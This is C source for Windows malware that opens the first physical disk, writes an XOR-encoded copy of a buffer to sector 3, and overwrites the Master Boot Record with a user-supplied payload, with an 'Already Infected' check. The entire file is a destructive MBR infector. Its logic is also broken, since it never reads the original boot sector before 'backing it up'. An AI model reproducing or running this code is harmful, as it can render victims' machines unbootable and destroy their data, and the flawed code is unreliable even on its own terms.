#include <Windows.h>
#include <stdio.h>
#define _CRT_SECURE_NO_WARNINGS
#define MB_BUF_SIZE 0x200
unsigned char payload[MB_BUF_SIZE]; // {your payload};

int main()
{
	DWORD rd;
	BOOL ok;
	BYTE* pBuffer;
	LPVOID mbr = VirtualAlloc(NULL, MB_BUF_SIZE, MEM_COMMIT, PAGE_READWRITE);
	LPVOID buffer = VirtualAlloc(NULL, MB_BUF_SIZE, MEM_COMMIT, PAGE_READWRITE);
	HANDLE _handle = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (_handle == INVALID_HANDLE_VALUE) // 
	{
		printf("INVALID_HANDLE_VALUE (1)\n"); //debug only
	}


	BYTE* p = (BYTE*)mbr;
	if (*p == 0x90)
	{
		CloseHandle(_handle);
		printf("Already Infected \n");
		goto exit; // sorry
	}
	CloseHandle(_handle);

	pBuffer = (BYTE*)buffer;
	for (int i = 0; i < MB_BUF_SIZE; i++, p++, pBuffer++)
	{
		*pBuffer = *p ^ 0x90;
	}
	_handle = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	if (_handle == INVALID_HANDLE_VALUE)
	{
		printf("INVALID_HANDLE_VALUE (3)\n"); //debug only
	}
	SetFilePointer(_handle, 512 * (4 - 1), NULL, FILE_BEGIN);
	ok = WriteFile(_handle, buffer, MB_BUF_SIZE, &rd, NULL); // 
	if (!ok)
	{
		printf("Error write data(4)\n"); // debug only
	}
	memcpy(mbr, payload, 0x1bd);
	SetFilePointer(_handle, 0, NULL, FILE_BEGIN);
	WriteFile(_handle, mbr, MB_BUF_SIZE, &rd, NULL);
	CloseHandle(_handle);
exit:
	VirtualFree(mbr, MB_BUF_SIZE, MEM_RELEASE);
	VirtualFree(buffer, MB_BUF_SIZE, MEM_RELEASE);
	system("pause");
	return 0;

}

